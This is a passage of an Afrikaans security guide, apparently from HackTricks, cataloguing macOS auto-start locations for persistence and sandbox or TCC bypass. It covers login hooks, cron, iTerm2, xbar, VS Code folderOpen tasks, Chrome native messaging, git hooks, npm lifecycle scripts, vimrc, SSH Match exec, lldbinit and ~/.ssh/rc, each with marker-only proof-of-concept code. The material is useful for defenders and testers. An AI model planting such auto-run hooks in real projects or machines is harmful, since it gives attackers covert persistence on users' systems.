**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` kan uitvoer
  - `Lo` geleë in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is verouderd, maar kan gebruik word om opdragte uit te voer wanneer ’n gebruiker aanmeld.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Hierdie instelling word gestoor in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Om dit te verwyder:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Die een vir die root-gebruiker word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Voorwaardelike Sandbox Bypass

> [!TIP]
> Hier kan jy beginliggings vind wat nuttig is vir **sandbox bypass**, sodat jy iets eenvoudig kan uitvoer deur dit **na ’n lêer te skryf** en **omstandighede te verwag wat nie baie algemeen is nie**, soos spesifieke **programme wat geïnstalleer is, “ongewone” gebruikeraksies** of omgewings.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Jy moet egter die `crontab`-binary kan uitvoer
  - Of root wees
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/usr/lib/cron/tabs/`**
  - Root word vereis vir direkte skryftoegang. Root word nie vereis as jy `crontab <file>` kan uitvoer nie
  - **Sneller**: Die skedule in die geïnstalleerde crontab. `at` en `periodic` is afsonderlike meganismes hieronder.

#### Beskrywing en uitbuiting

Lys die cron-take van die **huidige gebruiker** met:

```bash
crontab -l
```

Die launchd-plist van die stelsel se cron-daemon het ’n `QueueDirectories`-inskrywing vir `/usr/lib/cron/tabs`; dit is waar geïnstalleerde gebruiker-crontabs gehou word. Om ander gebruikers se crontabs te inspekteer, vereis root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

In ’n weggooibare rekening kan ’n gebruikers-cron-inskrywing wat slegs ’n merker bevat met `crontab` geïnstalleer en ná waarneming verwyder word. Deur `crontab <file>` uit te voer, **word die rekening se hele bestaande crontab vervang**, dus moet jy dit stoor en herstel as die rekening nie weggooibaar is nie:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Skrywe: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 het vroeër TCC-toestemmings gehad

#### Ligginge

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Sneller**: Begin iTerm2 met ’n geskikte Python API-script in daardie vouer
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Sneller**: Begin iTerm2; die AppleScript-opstart-hook word afsonderlik gedokumenteer
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Sneller**: Skep ’n sessie met die profiel waarvan die opdrag of aanvanklike teks die payload aanroep

#### Beskrywing en uitbuiting

Die [huidige iTerm2 Python API-gids](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) dokumenteer auto-run **Python**-scripts in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Dit bevestig nie dat ’n arbitrêre uitvoerbare `.sh`-lêer in daardie vouer loop nie. Stoor dit vir ’n weggooibare rekening as `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Die [huidige iTerm2 AppleScript-gids](https://iterm2.com/documentation-scripting.html) dokumenteer afsonderlik `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, met `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` as ’n verouderde terugvalopsie wanneer die moderne vouer nie bestaan nie. ’n AppleScript wat slegs ’n merker bevat, is:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Hierdie skripvoorbeelde is aan iTerm2 se dokumentasie getoets, maar is nie in die aktiewe lessenaarsessie uitgevoer nie. Nadat jy dit in ’n weggooibare rekening getoets het, verwyder die toetsskrip en `/tmp/ht-iterm-autolaunch-marker` of `/tmp/iterm2-autolaunchscpt`, onderskeidelik.

Die iTerm2-voorkeure in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan ’n profielopdrag of aanvanklike teks spesifiseer. Laasgenoemde word in ’n sessie ingetik; uitvoering hang daarvan af of ’n shell dit interpreteer. [iTerm2 se profieldokumentasie](https://iterm2.com/documentation-preferences-profiles-general.html) beskryf die opdrag wat uitgevoer word wanneer ’n nuwe sessie met daardie profiel geskep word.

Hierdie instelling kan in die iTerm2-instellings opgestel word:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die opdrag word in die voorkeure weerspieël:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

### xbar

Skryfstuk: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar xbar moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dit versoek Accessibility-toestemmings

#### Ligging

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Sneller**: Sodra xbar uitgevoer word

#### Beskrywing

As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om ’n shell script in **`~/Library/Application\ Support/xbar/plugins/`** te skryf wat uitgevoer sal word wanneer xbar begin:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar Hammerspoon moet geïnstalleer wees
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Dit vra vir Toeganklikheidstoestemmings

#### Ligging

- **`~/.hammerspoon/init.lua`**
  - **Sneller**: Sodra Hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as ’n outomatiseringsplatform vir **macOS** en gebruik die **LUA-skriptaal** vir sy werking. Dit ondersteun veral die integrasie van volledige AppleScript-kode en die uitvoering van shell-skripte, wat sy skripmoontlikhede aansienlik uitbrei.<sup>[[13]](#references)</sup>

Die toepassing soek na ’n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word, word die skrip uitgevoer.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar BetterTouchTool moet geïnstalleer wees
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dit vra vir Automation-Shortcuts- en Accessibility-toestemmings

#### Ligging

- ’n Script-lêer waarna ’n geaktiveerde BetterTouchTool-voorinstelling **reeds verwys**, of daardie voorinstelling se konfigurasie onder `~/Library/Application Support/BetterTouchTool/`. Die presiese script-pad hang af van hoe die voorinstelling opgestel is.

[BetterTouchTool se aksieverwysing](https://docs.folivora.ai/docs/actions/action-definitions/) dokumenteer shell-script- en agtergrondopdragaksies. Die opgestelde sleutelbord-, muis-, raak-, legstuk- of ander gebeurtenis moet plaasvind terwyl die toepaslike voorinstelling aktief is; [sy sneller-gids](https://docs.folivora.ai/docs/configuration/new-trigger/) wys hoe hierdie kombinasie werk. ’n Willekeurige lêer in die toepassingsondersteuningsgids is nie ’n sneller nie. ’n Reeds opgestelde aksie wat ’n eksterne skryfbare script laai, is ’n meer beperkte skryf-na-uitvoering-teiken. Kode loop as die BetterTouchTool-gebruiker se rekening, onderhewig aan sy werklike macOS-toestemmings. BetterTouchTool was afwesig uit `/Applications` op die navorsings-Mac, daarom is geen voorinstelling plaaslik verander of uitgevoer nie.

### Alfred

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar Alfred moet geïnstalleer wees
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dit vra vir Automation-, Accessibility- en selfs Full-Disk Access-toestemmings

#### Ligging

- ’n Script of lêer waarna ’n geïnstalleerde Alfred-werkvloei **reeds verwys**, of daardie werkvloei binne die gebruiker se opgestelde `Alfred.alfredpreferences`-gids. Die voorkeurgids kan gesinkroniseer word en het nie ’n vaste universele pad nie.

[Alfred se werkvloeigids](https://www.alfredapp.com/help/workflows/) beskryf die Powerpack-voorvereiste en installasie deur sy UI. ’n Geïnstalleerde werkvloei se snelsleutel, sleutelwoord of ander opgestelde sneller moet afgaan; [Alfred se snelsleutelvoorbeeld](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) demonstreer ’n script-aksie. [Alfred se omgewingsverwysing](https://www.alfredapp.com/help/workflows/script-environment-variables/) stel die gekose voorkeurpad as `alfred_preferences` beskikbaar. Om ’n ongeregistreerde werkvloeilêer in ’n willekeurige gids te plaas, bewys nie dat dit geïnstalleer of uitgevoer sal word nie. Kode loop as die aangemelde Alfred-gebruiker, met sy werklike macOS-toestemmings. Alfred was afwesig uit `/Applications` op die navorsings-Mac, daarom is hierdie pad slegs op grond van dokumentasie beoordeel.

### Raycast Script Commands en uitbreidingverversing

- **Skryfteiken:** ’n Uitvoerbare script in ’n gids wat **reeds bygevoeg** is onder Raycast Settings → Script Commands. Raycast skandeer nie ’n arbitrêr nuutgeskepte gids nie. [Raycast se Script Commands-gids](https://manual.raycast.com/script-commands) dokumenteer gidsregistrasie.
- **Sneller en identiteit:** ’n Gebruiker roep die geïndekseerde opdrag aan, ’n opgestelde snelsleutel of fallback roep dit aan, of Raycast verfris ’n `inline`-script volgens sy opgestelde `@raycast.refreshTime`. Die script loop as die aangemelde Raycast-gebruiker deur sy interpreter. Die [opstroom-metadata-verwysing](https://github.com/raycast/script-commands#metadata) beperk outomatiese verversing tot inline-opdragte, en [Raycast se uitbreiding-manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) ondersteun afsonderlik ’n `interval` vir geïnstalleerde `no-view`- of `menu-bar`-uitbreidingsopdragte. Om bloot ’n normale script-opdrag by te voeg, skeduleer dit nie.

Vir ’n weggooibare rekening met ’n geregistreerde script-gids, is ’n inline-script wat slegs ’n merker skryf:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Stoor dit in die geregistreerde gids, maak dit uitvoerbaar en laat Raycast dit verfris. Verwyder dan daardie lêer en `/tmp/ht-raycast-refresh-marker`. Raycast is nie onder sy gewone naam in `/Applications` op die navorsings-Mac gevind nie, dus is dit deur dokumentasie gestaaf en nie plaaslik uitgevoer nie. Toeganklikheid-, Outomatisering- en lêertoestemmings bly onderhewig aan macOS-toestemmingsversoeke.

### Visual Studio Code outomatiese werkruimtetake

- **Teikenskryfligging:** `.vscode/tasks.json` binne ’n werkruimte wat die gebruiker sal oopmaak.
- **Sneller:** Wanneer daardie werkruimte in VS Code oopgemaak word, maar slegs wanneer die vouer vertrou word **en** outomatiese take toegelaat is. ’n Nie-vertroude werkruimte voer nooit outomatiese take uit nie; die verstekinstelling vra die gebruiker voordat die eerste outomatiese taak uitgevoer word. [VS Code-taakdokumentasie](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) en [dokumentasie oor Werkruimtevertroue](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) beskryf albei hierdie voorwaardes.
- **Uitvoeringsidentiteit:** Die VS Code-gebruikersrekening, deur die gekonfigureerde taakproses. Dit is toepassingspesifieke uitvoering, nie aanmeldingsvolharding nie.

Plaas in ’n **nuwe, weggooibare werkruimte** hierdie taak wat slegs ’n merker plaas in `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nadat jy die vertroude werkruimte oopgemaak en outomatiese take toegelaat het, kyk vir `.autostart-task-ran`. Verwyder die taakinskrywing en merker om op te ruim. **Dit is teen Microsoft se dokumentasie en die geïnstalleerde VS Code 1.139.1-bundel geverifieer; dit is nie in die aktiewe lessenaarsessie uitgevoer nie.**

### Chrome native messaging hosts

- **Skryfdoelwit:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` vir die huidige gebruiker, of `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` vir alle gebruikers (administrateur-skryftoegang benodig). Chromium en Chrome for Testing gebruik verskillende gidse; sien [Chrome se huidige padtabel](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Sneller:** ’n Geïnstalleerde Chrome-uitbreiding met die `nativeMessaging`-toestemming roep `chrome.runtime.connectNative()` of `chrome.runtime.sendNativeMessage()` met die manifest se presiese gasheernaam. Chrome begin dan die gasheeruitvoerbare lêer. Om Chrome bloot oop te maak, voer nie ’n willekeurige nuwe native host uit nie; om ’n manifest te skep sonder ’n uitbreiding wat dit aanroep, doen niks. [Chrome se native messaging-gids](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) dokumenteer hierdie handdruk.
- **Uitvoeringsidentiteit:** Die Chrome-gebruiker se rekening. Die manifest moet ’n absolute pad na ’n uitvoerbare lêer spesifiseer en die oorsprong van die uitbreiding wat dit aanroep, uitdruklik toelaat.

In ’n weggooibare blaaierrekening met ’n toetsuitbreiding demonstreer die volgende paar lêers die skakel tussen skryf en uitvoering. Die manifest se lêernaam moet met sy `name` ooreenstem, en `TEST_EXTENSION_ID` moet deur daardie uitbreiding se werklike ID vervang word:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Stoor hierdie JSON as `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Die uitvoerbare lêer wat slegs as merker dien by die manifest se `path` kan bevat:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nadat die toetsuitbreiding `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` vanaf sy dienswerker of uitbreidingsbladsy aanroep, bewys die merker dat die gasheer begin het. Hierdie minimale gasheer implementeer nie Chrome se antwoordprotokol met lengtevoorvoegsel nie, dus kan die uitbreiding ’n boodskapfout rapporteer nadat die merker geskryf is. Verwyder die toetsmanifest, gasheer en merker om skoon te maak. Op macOS 26.5.2 was die Chrome-toepassing en albei manifestgidse teenwoordig; **die aktiewe Chrome-profiel is nie gewysig of gebruik nie**.

### Karabiner-Elements-sleutelgebeurtenisopdragte

- **Skryfdoelwit:** `~/.config/karabiner/karabiner.json` in ’n rekening waar Karabiner-Elements geïnstalleer is en loop. [Karabiner se gids vir lêerliggings](https://karabiner-elements.pqrs.org/docs/json/location/) sê dat die toepassing hierdie lêer dophou en herlaai nadat dit geskryf is. JSON-lêers in `assets/complex_modifications` is slegs invoerbare voorafinstellings; om bloot een daar te skryf, aktiveer nie ’n reël nie.
- **Sneller:** Die ingestelde sleutelgebeurtenis nadat die reël aktief is. Die [`to.shell_command`-verwysing](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) dokumenteer die uitvoering van opdragte. Dit is nie kode-uitvoering wanneer jy aanmeld of met elke lêerskrywing nie.
- **Uitvoeringsidentiteit:** Die aangemelde gebruiker wat Karabiner se gebruikersproses laat loop. Die toestemmingstoekennings daarvan en enige TCC-toegang hang af van die toepassing en weergawe.

Voeg vir ’n weggooitoetsrekening hierdie reëlobjek by die gekose profiel se `complex_modifications.rules`-skikking in `karabiner.json`, terwyl die res van daardie profiel behoue bly. Druk F18 om ’n onskadelike merker te skep, en verwyder dan hierdie reël en die merker. Deur F18 te kies, vermy jy dat ’n gewone tiktoets vervang word:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements was nie in `/Applications` op die macOS 26.5.2-toetsmasjien geïnstalleer nie, dus is dit ’n dokumentasie-gesteunde PoC eerder as ’n plaaslike looptydresultaat.

### Git-hooks in ’n plaaslike bewaarplek

- **Skryfdoel:** ’n Uitvoerbare hook soos `<repo>/.git/hooks/post-checkout`. As `core.hooksPath` reeds gestel is, gebruik eerder daardie gekonfigureerde gids. ’n Hook wat as ’n gewone gevolgde bronlêer gecommit is, word nie outomaties in ’n kloon geïnstalleer nie.
- **Sneller:** Die ooreenstemmende Git-bewerking. `post-checkout` loop byvoorbeeld ná `git checkout` of `git switch`, en kan ook ná ’n kloon of worktree-skepping loop. [Git se hook-verwysing](https://git-scm.com/docs/githooks) lys die gebeurtenisse en vereiste uitvoerbare-bis; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) verander die gids waarin gesoek word.
- **Uitvoeringsidentiteit:** Die rekening wat Git uitvoer. Die hook kan slegs loop as die bewaarplek se effektiewe hooks-gids skryfbaar is vir die akteur en die gebruiker later die betrokke Git-bewerking uitvoer.

Hierdie PoC, wat slegs ’n merker skep, skep ’n heeltemal weggooibare bewaarplek, installeer een hook en skakel na ’n tak oor. Dit is suksesvol uitgevoer met Apple Git 2.50.1 op macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm-lifecycle-skripte in ’n projek

- **Teikenskryfplek:** Die `scripts`-map in ’n skryfbare projek se `package.json`, of ’n geïnstalleerde afhanklikheidspakket waarvan die gebruiker die lifecycle script sal laat loop. Dit is ’n haakplek vir ’n ontwikkelingswerkvloei, nie uitvoering wanneer ’n gids oopgemaak word nie.
- **Sneller en identiteit:** ’n Latere `npm install` of `npm ci` laat `preinstall`, `install` en `postinstall` as die gebruiker wat npm aanroep, loop wanneer lifecycle-skripte toegelaat word. ’n Gewone `npm run <name>` laat ook die ooreenstemmende `pre<name>`- en `post<name>`-skripte loop. [npm se lifecycle-verwysing](https://docs.npmjs.com/cli/v11/using-npm/scripts) lys die gebeure; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) kan install-lifecycle-skripte onderdruk. Weergawe- en beleidinstellings kan verander wat toegelaat word, dus moet jy die teiken se npm-weergawe nagaan.

Hierdie merker-alleen-PoC is met plaaslike npm in ’n tydelike, leë gids uitgevoer. Dit laai nie afhanklikhede af nie en verander nie ’n gebruiker se projek nie:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Dit verskil van Python-interpreter-opstartlêers: npm moet die betrokke installasie- of uitvoeraksie uitvoer, terwyl Python-`site`-kode tydens ’n gewone interpreter-aanroep gelaai kan word. Generiese `Makefile`-teikens en definisies van boup take vereis eweneens dat die gebruiker of ’n reeds opgestelde nutsding daardie teiken aanroep; dit is nie afsonderlike OS-outostartpaaie nie.

### Vim-opstartkonfigurasie

- **Skryfdoelwit:** `~/.vimrc` vir die gebruiker wat Vim sal begin (of ’n ander opstartlêer wat Vim se inisialiseringsvolgorde kies). [Vim se opstartverwysing](https://vimhelp.org/starting.txt.html) dokumenteer die lêer en die `VIMINIT`/`EXINIT`-oorheersings.
- **Sneller:** ’n Latere gewone Vim-begin wat hierdie konfigurasie laai. Vim se `-u NONE` omseil die gebruiker se vimrc. Dit is redigeerder-spesifieke uitvoering, nie ’n OS-aanmeldingssneller nie.
- **Uitvoeringsidentiteit:** Die Vim-gebruiker se rekening.

Die volgende geïsoleerde PoC is teen macOS se `/usr/bin/vim` uitgevoer; dit skryf geen werklike Vim-voorkeure of oop dokumente nie:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim het ’n aparte gebruikerskonfigurasiepad, `$XDG_CONFIG_HOME/nvim/init.lua` of `init.vim`, en laai ook skripte in sy `plugin/`-looptydgidse volgens sy [startup documentation](https://neovim.io/doc/user/starting/). Neovim was nie op die macOS 26.5.2-toetsmasjien geïnstalleer nie, dus is hierdie variant nie daar uitgevoer nie.

### SSH-kliëntkonfigurasie-opdragte

- **Skryfdoel:** `~/.ssh/config`, of ’n ander lêer wat dit reeds insluit. Dit is ’n **kliënt**-konfigurasielêer; dit is apart van die bedienerkant-`~/.ssh/rc` wat hieronder beskryf word.
- **Sneller:** ’n Bypassende `ssh`-aanroep. `Match exec` voer ’n plaaslike opdrag uit terwyl die kliënt sy konfigurasie evalueer, selfs vir `ssh -G`, wat konfigurasie druk sonder om te koppel. `ProxyCommand` loop wanneer die kliënt ’n bypassende verbinding opstel. `LocalCommand` loop eers ná ’n suksesvolle verbinding en vereis `PermitLocalCommand yes` (die verstek is `no`). Hierdie het verskillende tydsberekeninge en vereistes; ’n skryfbewerking alleen voer hulle nie uit nie. Sien die stroomop-[OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Uitvoeringsidentiteit:** Die plaaslike gebruiker wat `ssh` uitvoer. ’n Bypassende gasheer, ’n toepaslike konfigurasielêer en enige vereiste verbinding is nodig. `ssh -F` kan ’n ander konfigurasielêer kies.

Hierdie merker-alleen-PoC is met Apple se SSH-kliënt op macOS 26.5.2 uitgevoer. `-G` toets `Match exec` sonder om ’n netwerkverbinding te maak of die gebruiker se werklike SSH-konfigurasie te lees:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Ontfoutingsprogram-inisialiseringlêers

- **Teikenskryflêer:** `~/.lldbinit` of die lêer met hoër prioriteit wat spesifiek vir die toepassing is, soos `~/.lldbinit-lldb`. LLDB lees een wanneer die ontfouter begin. ’n `.lldbinit` in die huidige gids word **nie** by verstek uitgevoer nie; die gebruiker moet `target.load-cwd-lldbinit` aktiveer of `--local-lldbinit` deurgee. Sien die [LLDB-handleiding](https://lldb.llvm.org/man/lldb.html).
- **Sneller en identiteit:** Die gebruiker begin LLDB sonder `--no-lldbinit`; opdragte loop as daardie gebruiker. Die blote feit dat ’n projek oopgemaak word, beteken nie dat die projek se `.lldbinit` loop nie.

Die volgende toets wat slegs ’n merker gebruik, is met LLDB op macOS 26.5.2 uitgevoer, met ’n geïsoleerde tuisgids en werkgids:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Vir **GDB** lys die [stroomop-aanvangsdokumentasie](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) `$HOME/Library/Preferences/gdb/gdbinit` en daarna `~/.gdbinit` op macOS. ’n `.gdbinit` in die huidige gids is onderhewig aan die [veilige pad vir outomatiese laai](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), en `-nx`/`-nh` onderdruk initialiseringslêers. GDB was nie op die toets-Mac geïnstalleer nie, dus is hierdie variant nie plaaslik uitgevoer nie.

### SSHRC

Verslag: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar ssh moet geaktiveer en gebruik word
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - SSH-gebruik om FDA-toegang te hê

#### Ligging

- **`~/.ssh/rc`**
  - **Sneller**: Aanmelding via ssh
- **`/etc/ssh/sshrc`**
  - Root word vereis
  - **Sneller**: Aanmelding via ssh

> [!CAUTION]
> Om ssh aan te skakel, is Full Disk Access nodig:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beskrywing & Exploitation

By verstek, tensy `PermitUserRC no` in `/etc/ssh/sshd_config`, sal die skripte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer word wanneer ’n gebruiker **via SSH aanmeld**.<sup>[[14]](#references)</sup>

### **Aanmelditems**

Skrywe: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet `osascript` met argumente uitvoer
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Plekke

- **Geregistreerde login-item-helper-app:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (algemene gebundelde ligging).
  - **Sneller:** Registrasie kan die helper onmiddellik begin; daarna begin dit tydens latere gebruikersaanmeldings, onderhewig aan goedkeuring.
- **Geregistreerde gebundelde agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` of `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Sneller:** ’n Goedgekeurde agent kan tydens registrasie begin, en weer tydens latere aanmeldings; ’n goedgekeurde daemon begin wanneer die stelsel selflaai. ’n Daemon vereis administrateurgoedkeuring.

#### Beskrywing

In **System Settings → General → Login Items & Extensions** kan gebruikers aanmeld- en agtergronditems nagaan. macOS 13 en later bied [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) om gebundelde aanmelditems, launch agents en launch daemons te registreer. Die gedrag van [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) verskil volgens tipe en goedkeuringsstatus. **Dit is nie voldoende om ’n helper in ’n app-bondel te skryf om ’n nuwe aanmelditem te registreer nie.** Omgekeerd, as ’n reeds geregistreerde helper-uitvoerbare lêer skryfbaar is, kan die wysiging daarvan die volgende keer dat dit begin ’n uitwerking hê, sonder ’n nuwe registrasie; verifieer eers die werklike pad en kode-ondertekeningskontroles.

Die volgende is ’n leesalleen-manier om na gebundelde helpers op ’n Mac te soek; dit registreer of begin nie enige van hulle nie:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

